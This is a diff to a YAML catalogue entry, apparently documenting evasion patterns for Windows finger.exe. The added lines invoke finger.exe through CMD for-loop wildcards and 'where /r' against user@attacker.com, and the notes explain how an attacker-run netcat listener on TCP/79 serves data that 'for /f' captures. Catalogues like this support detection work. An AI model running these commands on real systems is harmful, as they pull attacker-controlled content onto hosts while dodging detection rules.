@@ -25,6 +25,14 @@ Patterns:
   - Pattern: "C:\\Windows\\System32\\finger.exe user@attacker.com"
     Wildcards: []
     Notes: "Direct invocation — response from attacker's finger server is printed to stdout"
+  - Pattern: "for %i in (C:\\Windows\\System32\\fin*.exe) do @%i user@attacker.com"
+    Wildcards: ["*"]
+    Notes: "Native CMD for loop with filesystem glob — expands fin*.exe directly in System32 without where.exe"
+    Method: "Simple for glob"
+  - Pattern: "for /f %i in ('where /r C:\\Windows\\System32 fin*.exe') do %i user@attacker.com"
+    Wildcards: ["*"]
+    Notes: "Recursive where search — fin* matches finger.exe; scoped to System32 to avoid matching other tools"
+    Method: "where /r recursive"
 PlatformNotes: |
   finger.exe is enabled on older/misconfigured Windows systems. It queries the RFC 1288 finger protocol (TCP/79). An attacker can run a netcat listener (`nc -l -p 79`) to serve arbitrary data. The response is printed to stdout and can be captured with `for /f`. In batch scripts use `%%i` instead of `%i`.
 Resources:
